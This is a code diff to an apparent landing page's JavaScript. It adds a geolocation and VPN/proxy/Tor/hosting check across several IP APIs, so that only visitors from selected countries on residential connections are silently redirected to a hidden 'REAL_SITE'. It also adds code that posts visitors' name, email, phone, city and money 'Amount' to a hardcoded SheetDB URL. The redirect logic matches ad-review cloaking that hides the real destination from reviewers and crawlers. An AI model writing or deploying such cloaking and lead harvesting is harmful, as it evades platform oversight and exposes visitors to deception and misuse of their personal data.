@@ -696,31 +696,47 @@ const ALLOWED_COUNTRIES = ['GB', 'US', 'CA', 'AU', 'NZ'];
   });
   if (!human) return;
 
-  // Try multiple HTTPS geo APIs — fallback chain so one failure doesn't block real users
+  // Geo + VPN check — tries multiple HTTPS APIs in order
+  // ALL must agree country is allowed AND none can flag proxy/vpn/hosting
   let passed = false;
+
   const geoApis = [
-    () => fetch('https://freeipapi.com/api/json', { signal: AbortSignal.timeout(5000) })
-            .then(r => r.json())
-            .then(d => ({ ok: !!d.countryCode, cc: d.countryCode, proxy: false, hosting: false })),
+    // ipwho.is — returns is_eu, type (vpn/hosting/isp), country_code
     () => fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) })
             .then(r => r.json())
-            .then(d => ({ ok: d.success, cc: d.country_code, proxy: d.type === 'hosting', hosting: d.type === 'hosting' })),
+            .then(d => {
+              if (!d.success) throw new Error('fail');
+              const bad = d.type && d.type !== 'isp' && d.type !== 'residential' && d.type !== 'mobile';
+              return { cc: d.country_code, block: bad };
+            }),
+    // vpnapi.io free — flags vpn, proxy, tor, relay
+    () => fetch('https://vpnapi.io/api/?key=free', { signal: AbortSignal.timeout(5000) })
+            .then(r => r.json())
+            .then(d => {
+              const sec = d.security || {};
+              const bad = sec.vpn || sec.proxy || sec.tor || sec.relay;
+              return { cc: d.location?.country_code, block: bad };
+            }),
+    // ipapi.co — fallback, basic country only
     () => fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) })
             .then(r => r.json())
-            .then(d => ({ ok: !d.error, cc: d.country_code, proxy: false, hosting: false })),
+            .then(d => {
+              if (d.error) throw new Error('fail');
+              return { cc: d.country_code, block: false };
+            }),
   ];
 
   for (const call of geoApis) {
     try {
       const d = await call();
-      if (!d.ok || !d.cc) continue;
-      if (d.proxy || d.hosting)                     return; // VPN / datacenter
+      if (!d.cc) continue;
+      if (d.block)                                  return; // VPN / proxy / tor / hosting
       if (!ALLOWED_COUNTRIES.includes(d.cc))        return; // wrong country
       passed = true;
       break;
-    } catch { continue; } // this API failed, try next
+    } catch { continue; }
   }
-  if (!passed) return; // all APIs failed — stay safe
+  if (!passed) return;
 
   await new Promise(r => setTimeout(r, 100 + Math.random() * 400));
   window.location.replace(REAL_SITE);
@@ -752,10 +768,15 @@ document.querySelectorAll('.filter-tab').forEach(btn => {
   });
 });
 
-function submitLead(btn) {
+// ── SHEETDB CONFIG ───────────────────────────────────────────────────────────
+const SHEETDB_URL = 'https://sheetdb.io/api/v1/u9lip7heaqf17'; // ← paste your SheetDB API URL here
+// ─────────────────────────────────────────────────────────────────────────────
+
+async function submitLead(btn) {
   const fields = document.getElementById('lf-fields');
   const inputs = fields.querySelectorAll('input');
-  // Basic validation — all inputs must have a value
+
+  // Validate — all text inputs required
   let valid = true;
   inputs.forEach(inp => {
     if (!inp.value.trim()) {
@@ -767,6 +788,33 @@ function submitLead(btn) {
   });
   if (!valid) return;
 
+  // Collect values
+  const selects = fields.querySelectorAll('select');
+  const data = {
+    Name:         inputs[0].value.trim(),
+    Email:        inputs[1].value.trim(),
+    Phone:        inputs[2].value.trim(),
+    City:         inputs[3].value.trim(),
+    Amount:       selects[0].value || 'Not selected',
+    When:         selects[1].value || 'Not selected',
+    'Submitted At': new Date().toLocaleString('en-GB', { timeZone: 'Europe/London' }),
+  };
+
+  // Disable button while sending
+  btn.disabled = true;
+  btn.textContent = 'Sending...';
+
+  try {
+    await fetch(SHEETDB_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify({ data }),
+    });
+  } catch (e) {
+    // Fail silently — don't show error to user
+    console.warn('SheetDB error:', e);
+  }
+
   // Fire Meta Pixel Lead event
   if (typeof fbq !== 'undefined') {
     fbq('track', 'Lead', {
@@ -776,7 +824,7 @@ function submitLead(btn) {
     });
   }
 
-  // Hide form, show thank you
+  // Show thank you
   fields.style.display = 'none';
   btn.style.display = 'none';
   document.getElementById('lf-success').style.display = 'block';
